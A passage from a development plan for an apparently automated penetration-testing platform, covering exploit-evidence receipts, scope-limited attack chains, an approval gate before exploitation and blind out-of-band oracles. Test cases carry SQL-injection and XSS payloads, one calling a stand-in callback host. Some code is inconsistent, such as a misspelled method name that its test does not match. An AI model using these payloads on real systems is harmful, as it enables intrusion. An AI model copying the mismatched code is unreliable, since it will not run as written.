        logger.warning("receipt_record_failed", vuln_id=vuln_id, error=str(e))
```

Add `import hashlib, uuid` at the top; include `receipt_id` in the `feedback.payload_validated` message payload.

- [ ] **Step 4: Run width the full agent suite**

Run: `poetry run pytest tests/test_exploit_agent.py -v`
Expected: PASS (new + existing 3 tests)

- [ ] **Step 5: Commit**

```bash
git add src/ai_osop/agents/exploit_agent.py tests/test_exploit_agent.py
git commit -m "feat(exploit): ExploitValidationAgent emits ExploitReceipt when receipts enabled"
```

---

### Task 12: Capture-time redaction in the sandbox execution path

**Files:**
- Modify: `src/ai_osop/agents/exploit_agent.py` (`_execute_in_sandbox`)
- Test: `tests/test_exploit_agent.py` (append)

- [ ] **Step 1: Write the failing test**

```python
async def test_sandbox_result_is_redacted_before_use(exploit_agent):
    from ai_osop.evidence.redaction import redact_text

    captured = {}

    async def fake_exec(self, sandbox_id, command, timeout):
        return {"stdout": "Authorization: Bearer abc-sup3rs3cr3ttok3n-value\nHTTP_CODE=200\n"}

    import ai_osop.safety.scope as scope_mod
    orig = scope_mod.SandboxManager.execute_in_sandbox
    scope_mod.SandboxManager.execute_in_sandbox = fake_exec
    try:
        out = await exploit_agent._execute_in_sandbox.__wrapped__(
            exploit_agent, "https://t", "x" * 5, "vuln-9"
        ) if hasattr(exploit_agent._execute_in_sandbox, "__wrapped__") else None
    finally:
        scope_mod.SandboxManager.execute_in_sandbox = orig
    body = redact_text(out["body"]) if out else ""
    assert "abc-sup3rs3cr3ttok3n-value" not in body
    assert "[REDACTED" in body
```

(If direct method patching proves awkward under the real SandboxManager async lifecycle, refactor `_execute_in_sandbox` to route the raw stdout through a module-level `_scrub = redact_text` before assigning `result["body"]`, then assert the scrubbed body directly.)

- [ ] **Step 2: Run** — FAIL
- [ ] **Step 3: Implement** — inside `_execute_in_sandbox`, after parsing, add:

```python
from ai_osop.evidence.redaction import redact_text
result["body"] = redact_text(body)
result["stdout"] = redact_text(raw_stdout)
```

- [ ] **Step 4: Run** — PASS
- [ ] **Step 5: Commit** `git commit -m "feat(safety): redact secret tokens from sandbox stdout/body before use"`

---

### Task 13: Capture out-of-band interaction onto receipts

**Files:**
- Modify: `src/ai_osop/agents/exploit_agent.py`
- Test: `tests/test_exploit_agent.py` (append)

- [ ] **Step 1: Write the failing test**

```python
async def test_receipt_oracle_signals_include_oob_fields(exploit_agent):
    store = MagicMock()
    store.record = AsyncMock(return_value="sig-oob")
    exploit_agent.receipt_store = store
    exploit_agent._execute_in_sandbox = AsyncMock(return_value={
        "status": "success", "http_code": 200, "body": "",
        "oast_interaction": {"type": "dns", "token": "tok-1"},
    })
    from ai_osop.core.config import settings
    settings.evidence_receipts_enabled = True
    try:
        await exploit_agent._validate_exploit({
            "target": "https://t", "payload": "x", "vulnerability_id": "vuln-oob",
            "approval_id": "apr-2", "vuln_class": "ssrf",
        })
    finally:
        settings.evidence_receipts_enabled = False
    receipt = store.record.await_args.args[0]
    assert receipt.oracle_signals["oast_hit"] is True
```

- [ ] **Step 2: Run** — FAIL (flag off by default → store.record never called)
- [ ] **Step 3: Implement** — none needed if Task 11 already propagates `oast_interaction` into `oracle_signals`; the failing case was the flag gating. This task exists to lock the behavior with a dedicated test. If Task 11 is complete and this test passes on first run, mark done and note "no additional impl needed".
- [ ] **Step 4: Run** — PASS
- [ ] **Step 5: Commit** `git commit -m "test(exploit): receipt oracle_signals capture OOB interactions"`

---

### Task 14: ReceiptStore instantiation + migration on startup

**Files:**
- Modify: `src/ai_osop/api/main.py`
- Test: `tests/test_evidence_wiring.py`

- [ ] **Step 1: Write the failing test**

```python
async def test_receipt_store_none_when_flag_off():
    from ai_osop.api.main import _build_receipt_store_if_enabled
    from ai_osop.core.config import settings

    settings.evidence_receipts_enabled = False
    try:
        assert _build_receipt_store_if_enabled(db_pool=None, integrity=None) is None
    finally:
        settings.evidence_receipts_enabled = False
```

- [ ] **Step 2: Run** — FAIL (`ImportError: cannot import name '_build_receipt_store_if_enabled'`)
- [ ] **Step 3: Implement in `main.py`**

```python
def _build_receipt_store_if_enabled(db_pool, integrity):
    if not settings.evidence_receipts_enabled:
        return None
    from ai_osop.evidence.store import ReceiptStore
    return ReceiptStore(db_pool=db_pool, integrity=integrity,
                        evidence_root=settings.evidence_root)
```

In the FastAPI `lifespan` startup (near `PrimitiveLedger` wiring, `main.py:404`): if `settings.evidence_receipts_enabled`, run `ensure_schema(session_memory._pg_pool)` first, then build the store and expose it for agent injection (e.g., stash on `app.state.receipt_store` and have the agent factory copy it onto `agent.receipt_store`).

- [ ] **Step 4: Run** — PASS
- [ ] **Step 5: Commit** `git commit -m "feat(api): wire ReceiptStore construction behind evidence flag"`

---

# Part II — Piece 2: Chain Executor Hardening

### Task 15: Composer admissibility filter

**Files:**
- Modify: `src/ai_osop/agents/chain_composer_agent.py`
- Test: `tests/test_chain_composer_schedules_exploits.py` (append)

- [ ] **Step 1: Write the failing test**

```python
async def test_composer_filters_chains_by_allowed_techniques():
    from unittest.mock import AsyncMock, MagicMock
    from ai_osop.agents.base import AgentContext
    from ai_osop.agents.chain_composer_agent import ChainComposerAgent
    from ai_osop.core.enums import AgentType
    from ai_osop.core.models import ScopeDefinition, Task

    ctx = MagicMock(spec=AgentContext)
    ctx.agent_id = "composer-1"
    ctx.agent_type = AgentType.ATTACK_CHAIN
    ctx.engagement_id = "eng-1"
    ctx.session_id = "eng-1"
    ctx.scope = ScopeDefinition(engagement_id="eng-1", allowed_techniques=["xss"])
    ctx.graph_memory = MagicMock()
    ctx.graph_memory.find_vulnerability_chains = AsyncMock(return_value=[
        {"nodes": [
            {"vuln": {"id": "v-x1", "type": "xss"}},
            {"vuln": {"id": "v-s1", "type": "sqli"}},
        ]},
        {"nodes": [{"vuln": {"id": "v-x2", "type": "xss"}}]},
    ])
    ctx.llm_client = AsyncMock()
    agent = ChainComposerAgent(ctx)

    task = Task(type="compose_exploit_chain", agent_type=AgentType.ATTACK_CHAIN, payload={}, engagement_id="eng-1")
    out = await agent._execute(task)
    kept = [c for c in out["chains"] if all(n.get("vuln", {}).get("type") == "xss" for n in c["nodes"])]
    assert len(out["chains"]) == 1
    assert out["chains"][0]["nodes"][0]["vuln"]["id"] == "v-x2"
```

- [ ] **Step 2: Run test to verify it fails** (`assert len(...) == 1` fails as both chains are returned)

- [ ] **Step 3: Implement in `chain_composer_agent.py` `_execute` (between find and think)**

```python
chains = await self.ctx.graph_memory.find_vulnerability_chains(engagement_id)
if not chains:
    return {"status": "success", "message": "No vulnerability chains found"}

scope = getattr(self.ctx, "scope", None)
allowed = {t.lower() for t in (getattr(scope, "allowed_techniques", []) or [])}
if allowed:
    admissible = []
    for chain in chains:
        hop_types = {str(n.get("vuln", {}).get("type", "")).lower() for n in chain.get("nodes", [])}
        if hop_types and hop_types.issubset(allowed):
            admissible.append(chain)
        else:
            logger.info("chain.filtered", dropped=sorted(hop_types - allowed))
    chains = admissible
if not chains:
    return {"status": "success", "message": "No admissible chains for scope"}
```

Note: keep vuln-class synonyms minimal — `idor ≈ bola`, `xss ≈ cross_site_scripting` — via a small module-level `_CLASS_SYNONYMS` normalizer applied to both sides before the subset check.

- [ ] **Step 4: Run** — PASS plus `poetry run pytest tests/test_chain_composer_schedules_exploits.py -v` fully green

- [ ] **Step 5: Commit** `git commit -m "feat(chain): composer filters chains against allowed_techniques scope"`

---

### Task 16: Executor aborts on first hop failure

**Files:**
- Modify: `src/ai_osop/agents/chain_executor_agent.py`
- Test: `tests/test_chain_executor_agent.py` (append)

- [ ] **Step 1: Write the failing test**

```python
async def test_executor_aborts_on_first_hop_failure():
    from unittest.mock import AsyncMock, MagicMock
    from ai_osop.agents.base import AgentContext
    from ai_osop.agents.chain_executor_agent import ChainExecutorAgent
    from ai_osop.core.enums import AgentType
    from ai_osop.core.models import Task

    ctx = MagicMock(spec=AgentContext)
    ctx.agent_id = "exec-1"
    ctx.agent_type = AgentType.ATTACK_CHAIN
    ctx.session_id = "eng-c"
    ctx.graph_memory = MagicMock()
    ctx.graph_memory.find_vulnerability_chains = AsyncMock(return_value=[{
        "id": "chain-X",
        "nodes": [
            {"url": "https://a", "vuln": {"id": "v-1", "type": "sqli", "payload": {}}},
            {"url": "https://b", "vuln": {"id": "v-2", "type": "xss", "payload": {}}},
            {"url": "https://c", "vuln": {"id": "v-3", "type": "rce", "payload": {}}},
        ],
    }])

    class _Facade:
        calls: int = 0
        async def validate_exploit(self, endpoint, vuln_class, payload):
            self.calls += 1
            return {"validated": self.calls == 1}  # hop 1 ok; hop 2 fails

    facade = _Facade()
    agent = ChainExecutorAgent(ctx)
    agent._exploit = facade

    task = Task(type="execute_exploit_chain", agent_type=AgentType.ATTACK_CHAIN, payload={}, engagement_id="eng-c")
    out = await agent._execute(task)

    assert facade.calls == 2                      # stopped before hop 3
    assert len(out["chain_run"]) == 2
    assert out["status"] == "chain_failed"
    assert out.get("aborted_at_hop") == 1
```

- [ ] **Step 2: Run** — FAIL (executor currently calls hop 3, status == "success")

- [ ] **Step 3: Implement in `chain_executor_agent.py._execute`**

After each hop's `chain_run.append(...)`, add:

```python
validated = bool(result.get("validated", False))
if not validated:
    return {
        "status": "chain_failed",
        "chain_run": chain_run,
        "aborted_at_hop": idx,
        "chain_id": chain_id,
    }
```

Apply the same early-return inside the `except` branch (abort with `aborted_at_hop=idx`, status `chain_failed`). Existing whole-chain success return becomes `{"status": "success", "chain_run": chain_run, "chain_id": chain_id}`.

- [ ] **Step 4: Run** — PASS + full `tests/test_chain_executor_agent.py` green

- [ ] **Step 5: Commit** `git commit -m "feat(chain): executor aborts at first failed hop, returns chain_failed"`

---

### Task 17: Executor records a receipt per hop

**Files:**
- Modify: `src/ai_osop/agents/chain_executor_agent.py`
- Test: `tests/test_chain_executor_agent.py` (append)

- [ ] **Step 1: Write the failing test**

```python
async def test_executor_records_receipt_per_attempted_hop(tmp_path):
    from unittest.mock import AsyncMock, MagicMock
    from ai_osop.agents.base import AgentContext
    from ai_osop.agents.chain_executor_agent import ChainExecutorAgent
    from ai_osop.core.enums import AgentType
    from ai_osop.core.models import Task

    ctx = MagicMock(spec=AgentContext)
    ctx.agent_id = "exec-2"
    ctx.agent_type = AgentType.ATTACK_CHAIN
    ctx.session_id = "eng-r"
    ctx.graph_memory = MagicMock()
    ctx.graph_memory.find_vulnerability_chains = AsyncMock(return_value=[{
        "id": "chain-R", "nodes": [
            {"url": "https://a", "vuln": {"id": "v-1", "type": "sqli", "payload": {}}},
            {"url": "https://b", "vuln": {"id": "v-2", "type": "xss", "payload": {}}},
        ],
    }])

    class _Facade:
        async def validate_exploit(self, endpoint, vuln_class, payload):
            return {"validated": True, "receipt_id": f"rcpt-underlying"}

    store = MagicMock(); store.record = AsyncMock(return_value="sig-hop")
    agent = ChainExecutorAgent(ctx)
    agent._exploit = _Facade()
    agent.receipt_store = store

    task = Task(type="execute_exploit_chain", agent_type=AgentType.ATTACK_CHAIN, payload={}, engagement_id="eng-r")
    await agent._execute(task)

    assert store.record.await_count == 2
    hop0 = store.record.await_args_list[0].args[0]
    assert hop0.chain_id == "chain-R"
    assert hop0.hop_idx == 0
    assert hop0.vuln_id == "v-1"
```

- [ ] **Step 2: Run** — FAIL

- [ ] **Step 3: Implement**

Class attribute `receipt_store: Any = None`. Wrap the per-hop block after `result = await self._exploit.validate_exploit(...)` and mirror in the `except` arm (with the exception → the receipt's `confirmation_note`, redacted):

```python
if getattr(self, "receipt_store", None) is not None and settings.evidence_receipts_enabled:
    try:
        from ai_osop.evidence.models import ExploitReceipt
        import uuid as _uuid
        hop_receipt = ExploitReceipt(
            receipt_id=f"rcpt-{_uuid.uuid4().hex[:12]}",
            engagement_id=engagement_id,
            vuln_id=vuln_id or "hop-unknown",
            approval_id=task.payload.get("approval_id", "chain-auto"),
            hop_idx=idx, chain_id=chain_id,
            verdict="confirmed" if validated else "not_confirmed",
            confidence=float(result.get("confidence", 0.0)) if validated else 0.0,
            confirmation_note=result.get("note", "")[:200],
            oracle_signals={"underlying_receipt": result.get("receipt_id")},
        )
        await self.receipt_store.record(hop_receipt)
    except Exception as e:  # noqa: BLE001
        logger.warning("hop_receipt_failed", hop=idx, error=str(e))
```

- [ ] **Step 4: Run** — PASS (all chain executor tests)

- [ ] **Step 5: Commit** `git commit -m "feat(chain): executor persists per-hop ExploitReceipt when enabled"`

---

### Task 18: Operator `abort_chain` task type

**Files:**
- Modify: `src/ai_osop/agents/chain_executor_agent.py`
- Test: `tests/test_chain_executor_agent.py` (append)

- [ ] **Step 1: Write the failing test**

```python
async def test_abort_chain_marks_hops_and_stops():
    ...  # construct agent as in Task 16; agent._abort_flags.add("chain-X")
    out = await agent._execute(Task(
        type="execute_exploit_chain", agent_type=AgentType.ATTACK_CHAIN,
        payload={"chain_id": "chain-X"}, engagement_id="eng-c"))
    assert out["status"] == "chain_failed"
    assert "aborted" in (out.get("note") or "")
```

- [ ] **Step 2: Run** — FAIL

- [ ] **Step 3: Implement**

Update `supports_task_type` to include `"abort_chain"`. In `_execute` add an early branch (`if task.type == "abort_chain":` add payload `chain_id` to `self._abort_flags` and return). In the hop loop, before each hop: `if chain_id in self._abort_flags: return {"status": "chain_failed", "note": "aborted by operator", "chain_run": chain_run, "chain_id": chain_id}`.

- [ ] **Step 4: Run** — PASS
- [ ] **Step 5: Commit** `git commit -m "feat(chain): operator abort_chain task type stops in-flight chains at next hop boundary"`

---

### Task 19: Phase-policy single source of truth + EXPLOITATION entry gate

**Files:**
- Delete: the `PHASE_POLICY` dict in `src/ai_osop/core/config.py:601-631`
- Delete: the `PHASE_POLICY` dict in `src/ai_osop/core/enums.py:218-249`
- Modify: `src/ai_osop/orchestrator/orchestrator.py:61-86` (EXPLOITATION row)
- Modify: `src/ai_osop/orchestrator/phase_monitor.py:249` (honor gate)
- Test: `tests/test_phase_autoadvance.py` (update), `tests/test_orchestrator_transitions.py` (append)

- [ ] **Step 1: Write the failing test**

```python
def test_config_shadow_phase_policy_removed():
    import ai_osop.core.config as c
    import ai_osop.core.enums as e
    assert not hasattr(c, "PHASE_POLICY")
    assert not hasattr(e, "PHASE_POLICY")
```

```python
async def test_exploitation_entry_requires_approval():
    orch = _make_orchestrator()
    policy = orch.PHASE_POLICY[EngagementPhase.EXPLOITATION]
    assert policy["manual_approval"] is True
    assert policy["auto_next"] is None
```

- [ ] **Step 2: Run** — FAIL (config/enums still expose PHASE_POLICY; exploitation policy is False/auto)

- [ ] **Step 3: Implement**

Delete both shadow dicts; update `Orchestrator.PHASE_POLICY[EngagementPhase.EXPLOITATION]` to `{"manual_approval": True, "auto_next": None}`; in `phase_monitor.py:249` phase-advance path, when `policy.get("manual_approval")` is True, do not auto-advance into that phase — surface an ApprovalRequest (reuse existing `ApprovalCoordinator` flow) and stay in the current completed phase until approved.

- [ ] **Step 4: Run** — `poetry run pytest tests/test_phase_autoadvance.py tests/test_orchestrator_transitions.py -v` PASS (existing unattended-run tests updated to inject a pre-approved EXPLOITATION phase per the spec's operational note; zero-vuln reroute `_resolve_auto_next` case still bypasses the gate).

- [ ] **Step 5: Commit** `git commit -m "fix(orchestrator): single PHASE_POLICY source; EXPLOITATION entry requires approval"`

---

# Part III — Piece 3: Blind-Oracle Expansion

### Task 20: Caller-side OAST context schema + adapter validation

**Files:**
- Modify: `src/ai_osop/adapters/oast_mcp.py`
- Test: `tests/test_oast_adapter_unit.py` (append)

- [ ] **Step 1: Write the failing test**

```python
def test_register_rejects_bad_context():
    import asyncio
    from ai_osop.adapters.oast_mcp import OASTAdapter

    adapter = OASTAdapter(registry=MagicMock())
    with pytest.raises(ScopeValidationError):
        asyncio.get_event_loop().run_until_complete(
            adapter.register(label="t", context={"engagement_id": "e-1"})  # missing required keys
        )
```

- [ ] **Step 2: Run** — FAIL (no validation today)

- [ ] **Step 3: Implement**

In `oast_mcp.py` add a module constant + a validation helper invoked at the top of `register`:

```python
REQUIRED_OAST_CONTEXT_KEYS = {"engagement_id", "vuln_class", "injection_point", "payload_hash"}
ALLOWED_VULN_CLASSES = {"blind_xss", "blind_sqli", "blind_ssti", "ssrf", "rce"}


def _validate_context(context: Dict[str, Any]) -> None:
    from ai_osop.core.exceptions import ScopeValidationError

    if context is None:
        raise ScopeValidationError("OAST context required for blind-oracle attribution")
    missing = REQUIRED_OAST_CONTEXT_KEYS - set(context)
    if missing:
        raise ScopeValidationError(f"OAST context missing keys: {sorted(missing)}")
    if str(context["vuln_class"]).lower() not in ALLOWED_VULN_CLASSES:
        raise ScopeValidationError(f"vuln_class {context['vuln_class']} not in {ALLOWED_VULN_CLASSES}")
    for k in context:
        if k not in REQUIRED_OAST_CONTEXT_KEYS:
            raise ScopeValidationError(f"Unexpected OAST context key: {k}")
```

Call `_validate_context(context)` first inside `register`. Update the docstring to reflect the enforced schema (this is the caller-side contract; the `oast-mcp` server is untouched).

- [ ] **Step 4: Run** — `poetry run pytest tests/test_oast_adapter_unit.py -v` → existing tests still pass (existing callers updated in place, none should omit the context now that it is required); new test passes.

- [ ] **Step 5: Commit** `git commit -m "feat(oast): enforce caller-side context schema on register (attribution integrity)"`

---

### Task 21: ExploitValidationAgent — namespaced OAST mint + dispatchers for blind classes

**Files:**
- Modify: `src/ai_osop/agents/exploit_agent.py`
- Test: `tests/test_exploit_agent.py` (append), `tests/test_exploit_oracles.py` (append)

- [ ] **Step 1: Write the failing tests**

```python
def test_blind_xss_requires_oast():
    conf = ExploitValidationAgent._sig_blind_xss("<script src=//oast/tok></script>", 200, "")
    assert conf == 0.0


def test_blind_sqli_requires_oast():
    conf = ExploitValidationAgent._sig_blind_sqli("'; EXEC xp_dirtree '//tok.oast/a'--", 200, "")
    assert conf == 0.0
```

```python
async def test_namespaced_oast_mint_carries_context(exploit_agent):
    from ai_osop.adapters.oast_mcp import OASTAdapter
    adapter = AsyncMock(spec=OASTAdapter)
    adapter.register = AsyncMock(return_value=("tok-abc", "https://oast.example/tok-abc"))
    exploit_agent.oast_adapter = adapter
    await exploit_agent._mint_namespaced_token(
        vuln_class="blind_xss", injection_point="body:comment", payload="<script src=x>"
    )
    ctx = adapter.register.await_args.kwargs["context"]
    assert ctx["vuln_class"] == "blind_xss"
    assert ctx["injection_point"] == "body:comment"
    assert "payload_hash" in ctx and len(ctx["payload_hash"]) == 64
```

- [ ] **Step 2: Run** — FAIL (`AttributeError` on `_mint_namespaced_token` / `_sig_blind_*`)

- [ ] **Step 3: Implement**

Add three short static dispatchers mirroring the existing `_sig_*` form, all returning `0.0` on body evidence only (the OAST poll at `_confirm_by_response` is the real oracle):

```python
@staticmethod
def _sig_blind_xss(payload: str, status: int, body: str) -> float:
    return 0.0


@staticmethod
def _sig_blind_sqli(payload: str, status: int, body: str) -> float:
    return 0.0


@staticmethod
def _sig_blind_ssti(payload: str, status: int, body: str) -> float:
    return 0.0
```

Register in `_CLASS_DISPATCHERS` under `blind_xss`, `blind_sqli`, `blind_ssti`. Add the orchestration helpers:

```python
async def _mnit_namespaced_token(self, vuln_class: str, injection_point: str, payload: str) -> Tuple[str, str]:
    return await self.oast_adapter.register(
        label=f"{vuln_class}:{injection_point}",
        context={
            "engagement_id": self.ctx.session_id,
            "vuln_class": vuln_class,
            "injection_point": injection_point,
            "payload_hash": hashlib.sha256(payload.encode()).hexdigest(),
        },
    )
```

Namespaced OAST lookup inside `_confirm_by_response`: when `vuln_class in {"blind_xss","blind_sqli","blind_ssti"}`, poll `self.oast_adapter.poll(token)` for the specific token minted for this probe; treat a hit as deterministic 0.97 (blind_xss) or 0.9 (blind_sqli/blind_ssti) per spec §3.2.

(`oast_adapter` becomes an optional runtime-injected attribute, default `None`; when None, blind classes always resolve "not_confirmed" with note "no OAST oracle available".)

- [ ] **Step 4: Run** — PASS
- [ ] **Step 5: Commit** `git commit -m "feat(exploit): namespaced OAST tokens + blind class dispatchers"`

---

### Task 22: blind_sqli dialect checks + template stubs

**Files:**
- Modify: `src/ai_osop/agents/exploit_agent.py` (refine `_sig_blind_sqli` to check dialect hints)
- Modify: `src/ai_osop/payload_engine/engine.py` (`PayloadTemplateLibrary`)
- Test: `tests/test_exploit_oracles.py`, `tests/test_payload_engine.py` (append)

- [ ] **Step 1: Failing tests**

```python
def test_blind_sqli_dialect_hint_required():
    # a payload with no dialect-appropriate OOB primitive cannot qualify
    assert ExploitValidationAgent._sig_blind_sqli("' OR 1=1--", 200, "") == 0.0
```

```python
def test_payload_engine_includes_blind_templates():
    from ai_osop.payload_engine.engine import PayloadTemplateLibrary

    lib = PayloadTemplateLibrary()
    for cls in ("blind_xss", "blind_sqli", "blind_ssti"):
        templates = lib.templates_for(cls)
        assert templates, f"missing template family {cls}"
```

- [ ] **Step 2: Run** — FAIL

- [ ] **Step 3: Implement**

Update `_sig_blind_sqli` to return 0.05 when the payload contains a recognized OOB primitive hint (`xp_dirtree`, `load_file(`, `dblink`, `utl_http`) — enough for the LLM tiebreak to route it to manual review, but not a confirm. Add three template stubs in `PayloadTemplateLibrary` whose payloads embed `{{OAST_CALLBACK_URL}}` placeholders filled by the caller from the minted token URL.

- [ ] **Step 4: Run** — PASS
- [ ] **Step 5: Commit** `git commit -m "feat(payload): blind-class template stubs + SQLi OOB dialect hints"`

---

# Part IV — Live Verification & Quality Gates

### Task 23: Qualification fixture — blind-sink `http.server`

**Files:**
- Modify: `tests/qualification/conftest.py`
- Test: `tests/qualification/test_blind_sink_fixture.py`

- [ ] **Step 1: Failing test**

```python
async def test_blind_sink_records_callback(blind_sink_target):
    import httpx

    url, seen = blind_sink_target
    async with httpx.AsyncClient() as client:
        r = await client.get(f"{url}/inject?cb={url}/cb/tok-99", follow_redirects=False)
    assert r.status_code in (200, 302)
    await asyncio.sleep(0.05)
    assert any("/cb/tok-99" in p for p in seen)
```

- [ ] **Step 2: Run** — FAIL (fixture absent)

- [ ] **Step 3: Implement fixture in `conftest.py` (after `local_target`/`js_target`)**

```python
@pytest.fixture
def blind_sink_target():
    """Ephemeral sink: /inject?cb=... triggers server-side GET to cb (blind SSRF/classic oracle)."""
    from http.server import BaseHTTPRequestHandler, HTTPServer
    import threading, urllib.parse

    seen: List[str] = []

    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            seen.append(self.path)
            parsed = urllib.parse.urlparse(self.path)
            if parsed.path == "/inject":
                qs = urllib.parse.parse_qs(parsed.query)
                cb = qs.get("cb", [""])[0]
                if cb:
                    threading.Thread(target=lambda: urllib.request.urlopen(cb, timeout=1), daemon=True).start()
            self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
        def log_message(self, *a):  # noqa: ANN002
            pass

    srv = HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{srv.server_port}", seen
    srv.shutdown()
```

- [ ] **Step 4: Run** — PASS

- [ ] **Step 5: Commit** `git commit -m "test(qualification): ephemeral blind-sink fixture for oracle verification"`

---

### Task 24: Live-verified receipts against the sink

**Files:**
- Test: `tests/qualification/test_receipts_live.py`

- [ ] **Step 1: Failing test** (exercise the full seam: agent → namespaced token → sink callback → receipt → `verify_chain`)

```python
@pytest.mark.integration
async def test_blind_ssrf_receipt_chain_verified(blind_sink_target, db_pool, tmp_path):
    from ai_osop.adapters.oast_mcp import OASTAdapter
    from ai_osop.evidence.migrations import ensure_schema
    from ai_osop.evidence.store import ReceiptStore
    from ai_osop.safety.scope import AuditIntegrity
    # ... build agent with mocked burp/sandbox returning {"oast_interaction": {...}}
    # record receipt; assert verify_chain(engagement) is True
    ...
```

(Contained `...` here expands to the Task 11/21 construction patterns; the reader has both earlier task test-bodies to copy verbatim.)

- [ ] **Step 2: Run** — FAIL
- [ ] **Step 3: Implement** the agent-side fix (`_execute_in_sandbox` needs to surface `oast_interaction` into the result dict so the receipt captures it — currently only read at `_confirm_by_response`).
- [ ] **Step 4: Run** — PASS
- [ ] **Step 5: Commit** `git commit -m "test(qualification): end-to-end blind-oracle receipt flow verified against live sink"`

---

### Task 25: Operational runbook for Juice Shop live-fire

**Files:**
- Create: `docs/runbooks/blind-oracle-verification.md`

- [ ] **Step 1: Document the Juice Shop verification recipe**

Contents: pull/up commands from `benchmarks/juiceshop/README.md:39-49`, the env (`OSOP_EVIDENCE_RECEIPTS_ENABLED=true`, scope allowing `localhost:3000`), the expected receipt on disk (`evidence/eng-*/art-*.json` shapes), how to read an `export_bundle` markdown, how to call `verify_chain` from a debug console.

- [ ] **Step 2: Commit** `git commit -m "docs(runbook): blind-oracle live verification against Juice Shop"`

---

### Task 26: Abuse/regression gates

**Files:**
- Test: `tests/test_safety_receipts_abuse.py`, `tests/test_phase_autoadvance.py` (phase-entry gate case), `tests/test_chain_composer_schedules_exploits.py` (scope-excluded), `tests/test_exploit_agent.py` (redaction-in-export)

- [ ] **Step 1–5: One bullet per gate**

| Gate | Test name | Assert |
|---|---|---|
| Scope-excluded hop refused by composer | `test_composer_refuses_out_of_scope_technique` | filtered chains list is empty |
| Abort path leaves `chain_failed` | `test_abort_records_chain_failed_ledger_state` | ledger transition called with `chain_failed` |
| Export never re-emits raw secret | `test_export_bundle_no_raw_secrets` | `"[REDACTED"` present, secret absent |
| EXPLOITATION entry blocked without approval | `test_auto_advance_halts_before_exploitation` | `phase_monitor` does not advance; pending approval recorded |

Run each test before/after its impl per task pattern; commit each as `test(safety): <gate>`.

---

### Task 27: Full-suite + linters + final live verification gate

**Files:**
- Repo-wide

- [ ] **Step 1: Run the complete suite**

`poetry run pytest --no-cov` → all green (or integration-marked skips where services are absent; document any skips in the PR body).

- [ ] **Step 2: Quality gates on touched files**

```bash
poetry runblack src/ai_osop/evidence src/ai_osop/agents src/ai_osop/adapters src/ai_osop/orchestrator src/ai_osop/api tests
poetry run isort src/ai_osop/evidence src/ai_osop/agents src/ai_osop/adapters src/ai_osop/orchestrator src/ai_osop/api tests
poetry run flake8 src/ai_osop/evidence src/ai_osop/agents src/ai_osop/adapters src/ai_osop/orchestrator
poetry run mypy src/ai_osop/evidence src/ai_osop/agents src/ai_osop/adapters src/ai_osop/orchestrator
```

All clean.

- [ ] **Step 3: Live-fire flip** — with the flag ON (`OSOP_EVIDENCE_RECEIPTS_ENABLED=true`) and Juice Shop up, execute one exploit validation end-to-end; confirm `exploit_receipts` row + on-disk artifact; run `verify_chain(engagement)` → True. Attach the output snippet to the PR description.

- [ ] **Step 4: Final commit + PR** `git commit -m "chore: quality gates; live-verified tranche"` and open the PR against `main`.

